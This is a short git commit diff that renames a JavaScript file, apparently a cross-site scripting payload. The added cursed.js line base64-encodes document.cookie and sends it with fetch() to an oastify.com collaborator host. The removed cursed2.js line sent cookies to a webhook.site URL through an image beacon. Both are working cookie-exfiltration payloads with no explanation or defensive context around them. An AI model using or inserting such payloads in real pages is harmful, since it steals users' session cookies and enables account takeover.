9e1e7a51710123ecc5ca73343022dd98ef7baaf9
Lain Iwakura <jack.frost2323@proton.me>
2025-02-22 20:39:54 +0300

    Update and rename cursed2.js to cursed.js

---
+++ cursed.js
@@ -0,0 +1,1 @@
+fetch('http://zwzj8egtzxergv72mwobg219m0srgk49.oastify.com/?a='+btoa(document.cookie))
--- cursed2.js
+++
@@ -1,1 +0,0 @@
-var x = new Image(); x.src = 'https://webhook.site/938f52e2-6c22-4239-8296-09fadc11ec72?data='+btoa(document.cookie);
